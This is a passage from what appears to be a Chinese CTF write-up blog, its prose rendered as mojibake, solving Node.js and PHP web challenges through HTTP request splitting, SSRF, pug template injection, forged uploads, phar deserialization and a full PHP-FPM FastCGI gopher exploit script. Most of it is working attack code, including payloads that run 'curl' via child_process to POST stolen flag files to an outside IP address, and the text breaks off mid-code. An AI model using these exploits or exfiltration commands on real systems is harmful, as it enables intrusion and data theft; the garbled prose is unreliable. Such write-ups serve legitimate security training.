è¿™é‡Œå‚ç…§dalaoçš„exphttps://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md (ç”¨çš„æ˜¯py2,æ‰€ä»¥ç”¨è™šæ‹Ÿæœºè·‘çš„æ‰æœ‰æ­£è§£): 123456789101112131415161718192021222324252627# coding=UTF-8import requestsfrom requests.utils import quotedef toOct(str): r=\"\" for i in str: if i&gt;='a'and i&lt;='z': r+='\\\\'+oct(ord(i))[1:] else: r+=i return r#This next line could test in nodejs interpreter so that we can observe the similar behavior about how http treat on unicode(\\u&#123;xxxx&#125; is js encode pattern)#Buffer.from('http://example.com/\\u&#123;010D&#125;\\u&#123;010A&#125;/test', 'latin1').toString()#Unicode ÄÄŠ will convert to latin1 which will only pick up the right most byteSPACE=u'\\u0120'.encode('utf-8')CRLF=u'\\u010d\\u010a'.encode('utf-8') # transfer from unicode to utf-8 (\\uxxxx is unicode's pattern)SLASH=u'\\u012f'.encode('utf-8')pug = toOct('''-[][\"constructor\"][\"constructor\"](\"console.log(this.process.mainModule.require('child_process').exec('curl 120.27.246.202:8888 -X POST -d $(cat fl*)'))\")()''').replace('\"','%22').replace(\"'\",\"%27\")#' and \" need to be double encodedprint quote(pug)payload='sol'+SPACE+'HTTP'+SLASH+'1.1'+CRLF*2+'GET'+SPACE+SLASH+'flag'+SPACE+'HTTP'+SLASH+'1.1'+CRLF+'x-forwarded-for:'+SPACE+'127.0.0.1'+CRLF+'adminauth:'+SPACE+'secretpassword'+CRLF+'pug:'+SPACE+pug+CRLF+'test:'+SPACEres=requests.get('http://120.27.246.202:8081/core?q='+quote(payload))#res=requests.get('http://web2.ctf.nullcon.net:8081/core?q='+requote_uri(payload))print res.content è„šæœ¬ä¸­æ³¨æ„ä¸€ä¸‹å‡ ç‚¹ï¼š1.å•å¼•å·ä¸åŒå¼•å·å‡éœ€è¦ç¼–ç ä¸¤æ¬¡æ¥ç»•è¿‡é»‘åå•ã€‚2.payloadæ‰§è¡Œæ—¶æ˜¯ç”¨- codeçš„å½¢å¼æ‰§è¡Œçš„ã€‚è¿™æ˜¯pugçš„ç‰¹æ€§ã€‚è¿˜å¯ä»¥#{}ä½†æ˜¯è¢«è¿‡æ»¤äº†åŒæ—¶è¿˜å­¦åˆ°äº†javascriptä¸­ç­‰ä»·çš„è¡¨è¾¾æ–¹å¼ï¼Œæ¯”å¦‚æ‰€å‚è€ƒçš„dalaoçš„payloadä¸­ç”¨åˆ°äº† 1[]['constructor']['constructor']('console.log(payload)')() ç­‰ä»·äº 1[].constructor.constructor('alert(12345)')() ç­‰ä»·äº 1Array.constructor('alert(12345)')() ç›¸å½“äºå€Ÿç”¨äº†æ•°ç»„çš„æ„é€ æ–¹æ³•æ¥è°ƒç”¨å‘½ä»¤ã€‚å¥‡æ€ªçš„æ˜¯æˆ‘åˆæ²¡å¼¹åˆ°shellã€‚curlå‘½ä»¤åˆ°æ˜¯æ²¡å•¥é—®é¢˜ NodeGameå‡ºé¢˜äººæ€è·¯å¾ˆç®€å•ï¼Œæ—¢ç„¶è¿™ä¸ªCRLF+ssrfæ¼æ´å¯ä»¥æ„é€ headers,é‚£æ„é€ æ–‡ä»¶ä¸Šä¼ ä¹Ÿå¯ä»¥å–½ã€‚æ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªé¢˜ç›®å…ˆæ¥çœ‹ç»™çš„æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug');var morgan = require('morgan');const multer = require('multer');app.use(multer(&#123;dest: './dist'&#125;).array('file'));app.use(morgan('short'));app.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))app.use(\"/template\",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) &#123; var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") )&#123; res.send(\"Errrrr, You have been Blocked\"); &#125; file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html);&#125;);app.post('/file_upload', function(req, res)&#123; var ip = req.connection.remoteAddress; var obj = &#123; msg: '', &#125; if (!ip.includes('127.0.0.1')) &#123; obj.msg=\"only admin's ip can use it\" res.send(JSON.stringify(obj)); return &#125; fs.readFile(req.files[0].path, function(err, data)&#123; if(err)&#123; obj.msg = 'upload failed'; res.send(JSON.stringify(obj)); &#125;else&#123; var file_path = '/uploads/' + req.files[0].mimetype +\"/\"; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path))&#123; try &#123; fs.mkdirSync(__dirname + file_path) &#125; catch (error) &#123; obj.msg = \"file type error\"; res.send(JSON.stringify(obj)); return &#125; &#125; try &#123; fs.writeFileSync(dir_file,data) obj = &#123; msg: 'upload success', filename: file_path + file_name &#125; &#125; catch (error) &#123; obj.msg = 'upload failed'; &#125; res.send(JSON.stringify(obj)); &#125; &#125;)&#125;)app.get('/source', function(req, res) &#123; res.sendFile(path.join(__dirname + '/template/source.txt'));&#125;);app.get('/core', function(req, res) &#123; var q = req.query.q; var resp = \"\"; if (q) &#123; var url = 'http://localhost:8081/source?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(\"&lt;p&gt;error occurs!&lt;/p&gt;\"); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding('utf8'); resp.on('error', function(err) &#123; if (err.code === \"ECONNRESET\") &#123; console.log(\"Timeout occurs\"); return; &#125; &#125;); resp.on('data', function(chunk) &#123; try &#123; resps = chunk.toString(); res.send(resps); &#125;catch (e) &#123; res.send(e.message); &#125; &#125;).on('error', (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(\"search param 'q' missing!\"); &#125;&#125;)function blacklist(url) &#123; var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125;var server = app.listen(8081, function() &#123; var host = server.address().address var port = server.address().port console.log(\"Example app listening at http://%s:%s\", host, port)&#125;) å…³äº/coreä¸ç”¨å¤šè¯´ï¼Œè·Ÿä¸Šé¢ä¸€æ ·ï¼Œè€Œå…³äºfile_uploadåˆ™ç±»ä¼¼ä¸Šé¢é‚£é¢˜çš„/flagã€‚è¿™æ ·ä¸€æ¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾æ–‡ä»¶ä¸Šä¼ çš„æ‰§è¡Œç‚¹åœ¨å“ªã€‚ 123456789app.get('/', function(req, res) &#123; var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") )&#123; res.send(\"Errrrr, You have been Blocked\"); &#125; file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html);&#125;); çœ‹åˆ°é¦–é¡µæ¥å—äº†ä¸€ä¸ªactionå‚æ•°ï¼Œä¼šå°†æˆ‘ä»¬ä¸Šä¼ åˆ°/template/ç›®å½•ä¸‹çš„æ–‡ä»¶pugæ¸²æŸ“ã€‚å¹¶ä¸”è¿”å›å€¼ã€‚è¿™æ ·çš„è¯æˆ‘ä»¬æ€è·¯å¤§è‡´å°±æ¸…æ™°äº†ï¼šè¿˜æ˜¯é€šè¿‡coreè¿›è¡Œssrfå¹¶ä¼ªé€ æ–‡ä»¶ä¸Šä¼ çš„httpåŒ…è®¿é—®åˆ°/flagã€‚ä¹‹åç›´æ¥é¦–é¡µæ–‡ä»¶åŒ…å«è§¦å‘æ¸²æŸ“ï¼Œå°±å¯ä»¥è®¿é—®åˆ°å†…å®¹ã€‚ç”±äºè¿™é‡Œç›´æ¥æ„é€ å¤´å¤ªéº»çƒ¦ï¼Œæ‰€ä»¥è¦å…ˆæŠ“ä¸ªç°æˆçš„pugæ–‡ä»¶ä¸Šä¼ åŒ…ä¼ªé€ ä¸‹ï¼Œæ³¨æ„åŒ…é‡Œé¢çš„ 123Content-Type: &#x2F;..&#x2F;templateContent-Length:292Connection:keep-alive ç­‰å‚æ•°ä¸å¯éšä¾¿ä¹±æ”¹è¿™é‡Œå€Ÿèµµå¸ˆå‚…è„šæœ¬å°æ”¹ä¸‹ï¼šhttps://www.zhaoj.in/read-6462.html 1234567891011121314151617181920212223242526272829303132333435import urllib.parseimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Content-Type: multipart/form-data; boundary=--------------------------191691572411478Connection: keep-alivecache-control: no-cacheHost: xContent-Length: 292-----------------------------191691572411478Content-Disposition: form-data; name=\"file\"; filename=\"exp.pug\"Content-Type: /../templatedoctype htmlhtml head style include ../../../../../../../flag.txt----------------------------919695033422425209299810--GET /flag HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)print(payload)r = requests.get('http://9901208f-146e-4356-bad4-2d95ad2b9060.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))print(r.text) ä¹Ÿæ˜¯å¸¸è§„çš„æŠŠæ„é€ å¥½çš„requestç”¨å­—ç¬¦ç»•è¿‡ã€‚å½“ç„¶æˆ‘ä»¬ä¸Šä¸€é“é¢˜çš„å…«è¿›åˆ¶ç­‰ç­‰å…¶ä»–ç»•è¿‡æˆ‘è§‰å¾—éƒ½å¯ä»¥ï¼Œæ¯•ç«Ÿæ­¤å¤„æ²¡é™åˆ¶urlä¼ å‚ä¸å«å­—æ¯ã€‚ 1&#x2F;?action&#x3D;exp æˆåŠŸåŒ…å«flagå€¼å¾—ä¸€æçš„æ˜¯æˆ‘æƒ³ç”¨curlç­‰ç­‰æ—¶åˆå¤±è´¥äº†ï¼Œæˆ‘æŒ‰å‡ºé¢˜äººç»™çš„æ–¹æ³•æ„é€ åŒ…é‡Œç›´æ¥æ”¾å‘½ä»¤ï¼Œç»“æœå¾ˆæ— è¯­ï¼š 12345678910111213141516POST &#x2F;file_upload HTTP&#x2F;1.1Host: localhost:8081Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------12837266501973088788260782942Content-Length: 6279Origin: http:&#x2F;&#x2F;localhost:8081Connection: closeReferer: http:&#x2F;&#x2F;localhost:8081&#x2F;?action&#x3D;uploadUpgrade-Insecure-Requests: 1-----------------------------12837266501973088788260782942Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;byc403.pug&quot;Content-Type: ..&#x2F;template- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http:&#x2F;&#x2F;120.27.246.202:8877 -X POST -d $(cat &#x2F;flag.txt)&#39;)-----------------------------12837266501973088788260782942-- æç¤ºä¸èƒ½ Couldnâ€™t connect to server.ç„¶è€Œå‡ºé¢˜äººçš„expé‡Œå°±æ˜¯ç”¨çš„execSync+curlã€‚æˆ‘ä¸çŸ¥é“ä»€ä¹ˆæƒ…å†µã€‚æ¯•ç«Ÿå…¬ç›Šèµ›ä¸¤é“nodeé¢˜éƒ½å·²ç»è¯å®ä¸èƒ½curl,wget,nc,bashç­‰ç­‰åå¼¹shellæˆ–è€…è¿å¤–ç½‘çš„æ“ä½œã€‚æ„Ÿè§‰å¾ˆè¿·ã€‚é‚£åªèƒ½æŒ‰èµµå¸ˆå‚…é‚£æ ·includeäº†ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"NCTF-phar-matches-everythingå¡«å‘","slug":"NCTF-phar-matches-everythingå¡«å‘","date":"2020-02-25T12:53:39.000Z","updated":"2021-02-18T05:09:38.746Z","comments":true,"path":"2020/02/25/NCTF-phar-matches-everythingå¡«å‘/","link":"","permalink":"https://www.bycsec.top/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/","excerpt":"ä¹‹å‰æ ¡èµ›webæœ€éš¾çš„ä¸€é“é¢˜â€¦â€¦å½“æ—¶æ°´å¹³èœçš„çœ‹éƒ½ä¸æ•¢çœ‹ï¼Œç°åœ¨æŒ‰å¸ˆå‚…è¦æ±‚æ¥åšåšè¿™é“é¢˜ã€‚(zjyå¸ˆå‚…è¯´è¿™é¢˜æŠŠphpç›¸å…³çŸ¥è¯†å‡ ä¹å…¨è€ƒäº†ï¼Œçœ‹æ¥æ˜¯å¾ˆé›†å¤§æˆçš„ä¸€é“é¢˜ç›®ã€‚) é¢˜ç›®é¦–å…ˆè¿›å»åæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯ä»…é™åˆ¶å›¾ç‰‡çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚å¦ä¸€ä¸ªæ˜¯ç”¨getimagesize()æ­é…çš„è¯»å–å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯çš„åŠŸèƒ½ é¦–å…ˆæ˜¯æºç æ³„éœ²ã€‚åœ¨catchmachine.phpå­˜åœ¨.swpæ³„éœ²ã€‚ç„¶è€Œbuuojä¸Šé¢˜ç›®å¹¶æ²¡æœ‰æ³„éœ²ï¼Œç›´æ¥çœ‹æºç å¥½äº†","text":"ä¹‹å‰æ ¡èµ›webæœ€éš¾çš„ä¸€é“é¢˜â€¦â€¦å½“æ—¶æ°´å¹³èœçš„çœ‹éƒ½ä¸æ•¢çœ‹ï¼Œç°åœ¨æŒ‰å¸ˆå‚…è¦æ±‚æ¥åšåšè¿™é“é¢˜ã€‚(zjyå¸ˆå‚…è¯´è¿™é¢˜æŠŠphpç›¸å…³çŸ¥è¯†å‡ ä¹å…¨è€ƒäº†ï¼Œçœ‹æ¥æ˜¯å¾ˆé›†å¤§æˆçš„ä¸€é“é¢˜ç›®ã€‚) é¢˜ç›®é¦–å…ˆè¿›å»åæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯ä»…é™åˆ¶å›¾ç‰‡çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚å¦ä¸€ä¸ªæ˜¯ç”¨getimagesize()æ­é…çš„è¯»å–å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯çš„åŠŸèƒ½ é¦–å…ˆæ˜¯æºç æ³„éœ²ã€‚åœ¨catchmachine.phpå­˜åœ¨.swpæ³„éœ²ã€‚ç„¶è€Œbuuojä¸Šé¢˜ç›®å¹¶æ²¡æœ‰æ³„éœ²ï¼Œç›´æ¥çœ‹æºç å¥½äº† 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Easytest&#123; protected $test; public function funny_get()&#123; return $this-&gt;test; &#125;&#125;class Main &#123; public $url; public function curl($url)&#123; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; &#125; public function __destruct()&#123; $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test-&gt;funny_get() === '1')&#123; echo $this-&gt;curl($this-&gt;url); &#125; &#125; &#125;if(isset($_POST[\"submit\"])) &#123; $check = getimagesize($_POST['name']); if($check !== false) &#123; echo \"File is an image - \" . $check[\"mime\"] . \".\"; &#125; else &#123; echo \"File is not an image.\"; &#125;&#125;?&gt; Mainç±»é‡Œçš„__destruct()å±…ç„¶å­˜åœ¨ååºåˆ—åŒ–ï¼Œå¾ˆæœ‰æ„æ€ã€‚ç„¶åå¦‚æœç»•è¿‡è¿™ä¸ªç‚¹å°†æ‰§è¡Œä¸€æ®µcurlï¼Œè¿™åˆæ˜¯ssrfçš„ç‚¹äº†ã€‚ä½†æ˜¯æˆ‘ä»¬åˆè¦ç»•è¿‡getimagesizeçš„æ£€æŸ¥ï¼Œè¿™å°±å¾—åˆ©ç”¨åˆ°pharååºåˆ—åŒ–äº†ï¼Œå› ä¸ºpharèƒ½ç»•è¿‡ç»å¤§éƒ¨åˆ†æ–‡ä»¶çš„æ£€æŸ¥ã€‚æ—¢ç„¶å¦‚æ­¤å…ˆssrfè¯»æ–‡ä»¶é‚£ä¹ˆæ„é€ exp: 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass Easytest&#123; protected $test=\"1\"; public function funny_get()&#123; return $this-&gt;test; &#125;&#125;class Main &#123; public $url=\"file:///etc/hosts\"; public function curl($url)&#123; $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; &#125; public function __destruct()&#123; $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test-&gt;funny_get() === '1')&#123; echo $this-&gt;curl($this-&gt;url); &#125; &#125;&#125;@unlink('phar.phar');$p = new Phar('phar.phar', 0);$p-&gt;startBuffering();$p-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ?&gt;');$o = new Main();$p-&gt;setMetadata($o);$p-&gt;addFromString('test.txt','test');$p-&gt;stopBuffering();$a = new Easytest();echo (urlencode(serialize($a)));#O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹åç¼€ä¸ºgif,jpegï¼Œå¯ä»¥ç»•è¿‡ä¸Šä¼ ã€‚è€Œæ‰“å°å‡ºçš„ç”¨äºè§¦å‘ssrfçš„é­”æœ¯æ–¹æ³•çš„ååºåˆ—åŒ–æ•°æ®åˆ™ä¼ åˆ°urlä¸­ã€‚ä¹‹åå†ç”¨phar://ä¼ªåè®®è§¦å‘ã€‚è¿™æ ·æˆ‘ä»¬å°±ç›´æ¥å†™å‡ºç”¨äºè§¦å‘pharååºåˆ—åŒ–çš„exp: 1234567891011import requestsurl='http://290b80a5-0d25-41e3-a73d-d01107cce539.node3.buuoj.cn/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D'data=&#123; 'name':'phar://uploads/d388a7ce2d.gif', 'submit':'1'&#125;r=requests.post(url,data=data)print(r.text) æ¥ä¸‹æ¥å°±æ˜¯ssrfåˆ©ç”¨äº†ï¼Œæ­¤å¤„ä¾æ—§æ˜¯æ‰“å†…ç½‘ã€‚æ¢æµ‹å®Œ 1234567&#96;&#96;&#96;bash::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters173.0.168.9 osrc æ­¤æ—¶é¡ºç€ä¸»æœºæ¢æµ‹http://173.0.168.10ï¼Œå¯ä»¥å‘ç°æœ‰å›æ˜¾php-FPMè¦æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œè¦æåˆ°pç‰›çš„æ–‡ç« ï¼šhttps://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html å…·ä½“pç‰›å†™çš„å¾ˆè¯¦ç»†,æˆ‘ä»¬çŸ¥é“çš„ï¼Œå°±æ˜¯å¯ä»¥ç›´æ¥æ‹¿è„šæœ¬åˆ©ç”¨è¿™ç‚¹ï¼Œä½¿ç”¨gopheråè®®ä¼ è¾“tcpæ•°æ®æ”»å‡»å†…ç½‘ï¼Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ä½¿ç”¨å¦‚ä¸‹è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293import socketimport randomimport argparseimport sysfrom io import BytesIOimport base64import urllib# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict')def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return sclass FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs=&#123;&#125;, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def gopher(self, nameValuePairs=&#123;&#125;, post=''): requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) return request def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:&#123;&#125; port:&#123;&#125;\".format(self.host, self.port)if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php echo \"PWNed\";?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) parser.add_argument('-e', '--ext', help='ext absolute path', default='') parser.add_argument('-if', '--include_file', help='evil.php absolute path', default='') parser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1) parser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file params = &#123; 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(args.code), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' &#125; if args.ext and args.include_file: #params['PHP_ADMIN_VALUE']='extension = '+args.ext params['PHP_ADMIN_VALUE']=\"extension_dir = /var/www/html\\nextension = ant.so\" params['PHP_VALUE']='auto_prepend_file = '+args.include_file if not args.url_format and not args.base64_format : response = client.request(params, args.code) print(force_text(response)) else: response = client.gopher(params, args.code) if args.url_format: print(urllib.quote(response)) if args.base64_format: print(base64.b64encode(response)) è°ƒç”¨æ—¶ï¼Œä¾æ®ä¸»æœºipä¿®æ”¹å‚æ•°ï¼š 1python exp.py 173.0.168.10 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -p 9000 -c &lt;?php phpinfo();?&gt; -u ç”Ÿæˆçš„æ•°æ®æµæˆ‘ä»¬å†åº¦ç”Ÿæˆpharæ–‡ä»¶ 12345678910111213&lt;?phpclass Main &#123; public 